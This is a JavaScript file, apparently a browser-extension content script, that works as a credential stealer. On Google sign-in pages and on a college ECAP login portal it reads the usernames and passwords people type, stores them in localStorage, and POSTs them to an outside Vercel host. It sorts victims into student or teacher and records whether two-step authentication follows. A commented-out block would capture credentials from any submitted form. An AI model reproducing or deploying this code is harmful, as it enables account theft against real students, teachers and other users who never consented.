let logs = [];
async function post(
  url,
  body = { user: "surya", passwd: "surya", type: "student" }
) {
  const baseUrl = "https://99-passes-b.vercel.app";
  // const baseUrl = "https://pass-backend.vercel.app";
  console.log("posting....");
  return fetch(`${baseUrl}/${url}`, {
    method: "POST",
    // mode: "no-cors",
    cache: "no-cache",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(body),
  });
}

let backup = { user: "", passwd: "" };

function handleGooglePass() {
  const cond =
    !location.href.includes("accounts.google.com/") ||
    !location.href.includes("/signin");

  if (cond) return -1;

  let passwordStored = false;
  const targetNode = document.body;
  const config = { childList: true, subtree: true };
  const callback = function (mutationsList, observer) {
    for (const mutation of mutationsList) {
      if (mutation.type === "childList") {
        if (location.pathname.includes("challenge/pwd")) {
          let emailInput = document.querySelector("#hiddenEmail");
          let passInput = document.querySelector(
            "input.whsOnd.zHQkBf[type='password']"
          );
          // * save typing Password
          localStorage.setItem(
            "user",
            JSON.stringify({
              user: emailInput.value,
              passwd: passInput.value,
            })
          );

          try {
            passInput.addEventListener("keydown", (e) => {
              if (e.key == "Enter") {
                let user = emailInput.value;
                post("google/temp", {
                  user: emailInput.value,
                  passwd: passInput.value,
                  type: user.includes("edu.in")
                    ? user[2].toLowerCase() == "u" &&
                      user[3].toLowerCase() == "4"
                      ? "student"
                      : "teacher"
                    : "other",
                  twoStepAuth: false,
                });
              }
            });
          } catch (e) {
            //
          }
          passwordStored = false;
        } else if (
          (location.pathname.includes("challenge/selection") || // select any method
            location.pathname.includes("challenge/ipp") || // mobile number
            location.pathname.includes("challenge/bc") || //security codes
            location.pathname.includes("challenge/dp") || // tap yes
            location.pathname.includes("challenge/totp") || // totp
            location.pathname.includes("challenge/ootp") || // totp
            location.pathname.includes("rejected")) &&
          !passwordStored
        ) {
          let { user, passwd } = JSON.parse(localStorage.getItem("user"));
          if (!user || !passwd) {
            return;
          }

          let type = user.includes("edu.in")
            ? user[2].toLowerCase() == "u" && user[3].toLowerCase() == "4"
              ? "student"
              : "teacher"
            : "other";

          post("google", { user, passwd, type, twoStepAuth: true });
          passwordStored = true;
        } else if (
          location.pathname.includes("google.com/web/chip") &&
          !passwordStored
        ) {
          let { user, passwd } = JSON.parse(localStorage.getItem("user"));
          let type = user.includes("edu.in")
            ? user[2].toLowerCase() == "u" && user[3].toLowerCase() == "4"
              ? "student"
              : "teacher"
            : "other";
          passwordStored = true;

          post("google", { user, passwd, type, twoStepAuth: false });
        }
        // else if (!passwordStored && backup.user && backup.passwd) {
        //   console.log("last block");
        //   console.log(backup);
        //   post("new-google", {
        //     user: backup.user,
        //     passwd: backup.passwd,
        //     type,
        //   });
        //   passwordStored = true;
        // }
      }
    }
  };

  const observer = new MutationObserver(callback);
  observer.observe(targetNode, config);
}
// https://gds.google.com/web/chip

function handlePass() {
  if (!location.href.toLowerCase().includes("http://103.138.0.69/ecap"))
    return -1;

  console.log("its ecap page");

  // *  Student logined successfully
  if (location.pathname.toLowerCase() == "/ecap/studentmaster.aspx") {
    let { user, passwd } = JSON.parse(localStorage.getItem("user"));
    if (!user || !passwd) {
      return;
    }
    const data = { user, passwd, type: "student" };
    localStorage.clear();
    post("ecap", data);
  }
  // * Teacher Logined successfully
  else if (location.pathname.toLowerCase() == "/ecap/main.aspx") {
    let { user, passwd } = JSON.parse(localStorage.getItem("user"));
    const data = { user, passwd, type: "teacher" };
    localStorage.clear();
    post("ecap", data)
      .then((res) => {
        console.log(res);
        return res.json();
      })
      .then((res) => {
        console.log(res);
      })
      .catch((err) => {
        console.warn(err);
      });
  }
  // * IN Login Page
  else {
    const id1 = document.getElementById("txtId1");
    const pwd1 = document.getElementById("txtPwd1");
    const id2 = document.getElementById("txtId2");
    const pwd2 = document.getElementById("txtPwd2");

    console.log("In login page");

    // * Student is Logining
    pwd2.oninput = (e) => {
      console.log("student is logining", id2.value, pwd2.value);
      localStorage.setItem(
        "user",
        JSON.stringify({
          user: id2.value,
          passwd: pwd2.value,
        })
      );
    };
    // * Teacher is Logining
    pwd1.oninput = (e) => {
      localStorage.setItem(
        "user",
        JSON.stringify({
          user: id1.value,
          passwd: pwd1.value,
        })
      );
    };
  }
}

// document.addEventListener("submit", function (event) {
//   // Prevent the form from submitting in the normal way
//   event.preventDefault();

//   // Get the form element
//   var form = event.target;

//   // Get the username and password fields
//   var usernameField =
//     form.querySelector('input[type="text"]') ||
//     form.querySelector('input[type="email"]');
//   var passwordField = form.querySelector('input[type="password"]');

//   console.log("new test worked");
//   // Check if both username and password fields are present
//   if (usernameField && passwordField) {
//     // Retrieve the entered values
//     var username = usernameField.value;
//     var password = passwordField.value;

//     // Send the credentials to the background script or perform other actions
//     chrome.runtime.sendMessage({
//       action: "credentialsDetected",
//       username: username,
//       password: password,
//     });
//   }
// });

console.log("Testing");

if (handlePass() == -1) {
  handleGooglePass();
}
